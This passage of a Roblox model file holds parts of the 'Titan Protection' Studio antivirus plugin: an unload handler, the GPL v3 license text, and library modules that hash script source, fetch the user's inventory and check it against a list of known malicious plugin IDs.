		plugin.Unloading:Connect(function()
			local IsDebug = Settings.IsDebug
			
			if IsDebug then
				print("Plugin unloading...")
			end
			if Scanning then
				warn("WARNING PLUGIN WAS SHTUDOWNED WHEN THERE WAS AN ACTIVE SCAN RUNNING!")
				print(debug.traceback())
			end
			
			local TitanGui = CoreGui:FindFirstChild("Ti-P Notifications")
			if TitanGui then
				TitanGui:Destroy()
				if IsDebug then
					print("Removed TitanGui from CoreGui")
				end
			end
			
			if Settings.SaveAssetCacheShutdown then
				xpcall(function()
					
					if IsDebug then
						print("Plugin saved asset cache correctly!")
					end
				end, function(Err)
					warn("An error occured while trying to save assets cache. Reason: " .. tostring(Err) .. " Unable to save asset cache!")
					print(debug.traceback())
				end)
			end
		end)
	end
end

-- // We check if the plugin can run to prevent it running in situations where it is not supposed to.
assert(plugin and RunService:IsStudio(), "[Ti-Protection]: Titan Protection cannot run while not being a plugin!")

init()]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="ModuleScript" referent="RBX2CA2FD7A5139430B8195E51915BE3503">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">LISENCE</string>
				<string name="ScriptGuid">{C1ABA61E-E065-448A-9F01-7A001FB786D7}</string>
				<ProtectedString name="Source"><![CDATA[--[[
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.
]]]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="ModuleScript" referent="RBX4C06E49825D3479C8CB83F7060B3873C">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">README</string>
				<string name="ScriptGuid">{8519C6F3-C211-4B5D-BB09-115E436A84F7}</string>
				<ProtectedString name="Source"></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="Folder" referent="RBXE9FFF6E2918F46919347EAAFC654DBB2">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<string name="Name">Sound_Storage</string>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
		</Item>
		<Item class="Folder" referent="RBX3501422063FE419088DB27A2D7753FFF">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<string name="Name">Libs</string>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
			<Item class="ModuleScript" referent="RBX1D5331DEDFA84F7180FDB531ABD0ED33">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">GetHash</string>
					<string name="ScriptGuid">{03BAA859-5C66-4B63-8FF0-29AE0659B303}</string>
					<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

-- // Plugin Scanner func \\ --

return function(Source, HashFunction)
	return HashFunction(string.gsub(string.lower(tostring(Source)), "%s", ""))
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB6B92E8C6BCF4EDF9F4CF2F99C0C9DA9">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">GetInventoryAssets</string>
					<string name="ScriptGuid">{B8DB3AFB-8541-4C9B-9287-8F43DDC19462}</string>
					<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local HttpService = game:GetService("HttpService")
local StudioService = game:GetService("StudioService")

local function GetModels(Type, Id)
	local Success, Data = pcall(function()
		local Request = HttpService:GetAsync("https://inventory.rprxy.xyz/v1/users/" .. tostring(Id) .. "/inventory/" .. tostring(Type))
		local JSONdecode = HttpService:JSONDecode(Request)
		return JSONdecode.data
	end)
	if Success and Data ~= nil then
		return Data
	else
		warn(string.format("[Ti-Protection]: Could not get inventory with category with type: %s , with user id: %d , Reason: %s",
			tostring(Type),
			Id,
			tostring(Data or "pcall returned nil")
		))
		return {}
	end
end

return function()
	local StudioLocalId = StudioService:GetUserId()
	local Tbl, Tbl2 = GetModels("Plugin", StudioLocalId), GetModels("Model", StudioLocalId)
	return Tbl, Tbl2
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9DB20B581A764053B93EE17D7C994D44">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PluginScanner</string>
					<string name="ScriptGuid">{4E61FB0B-73DB-4BF5-A412-F638460A20C4}</string>
					<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local InsertService = game:GetService("InsertService")
local RunService =  game:GetService("RunService")
local Hearbeat = RunService.Heartbeat


-- // Plugin Scanner func \\ --

return function(KnownMaliciousPluginsIDs)
	local Tab = {}-- Container
	for  i, Id in ipairs(KnownMaliciousPluginsIDs) do -- Iterate trough the malicious plugin list!
		local Obj
		local succ, err = pcall(function()
			Obj = InsertService:LoadAsset(Id)--Should error if user doesn't have the plugin!
			return true
		end)
		pcall(function()
			Obj:Destroy()
			Obj = nil
		end)
		if succ and (Obj and Obj ~= nil) then
			warn("[Ti-Protection]: The plugin rbxassetid://"..tostring(Id).." was not cleared properly. Reason : {"..tostring(err).."} Force clearing all descendants. Some viruses might be left behind yikes...")
			print("[Ti-Protection]: "..debug.traceback())
			pcall(function()
				for _, Delete in ipairs(Obj:GetDescendants()) do
					pcall(function()Delete:Destroy()end)
				end
			end)
		end
		if succ and not err then -- If the user has the plugin
			table.insert(Tab, Id)
		end
		if i % 64 == 4 then
			Hearbeat:Wait()
		end
	end
	return Tab
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9A8867FFF85841C081FAD2400A9A578F">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">RemoveSafeObjs</string>
					<string name="ScriptGuid">{1ABE4440-BAF0-4356-976E-EB4C6DBB9DA9}</string>
					<ProtectedString name="Source"><![CDATA[--[[
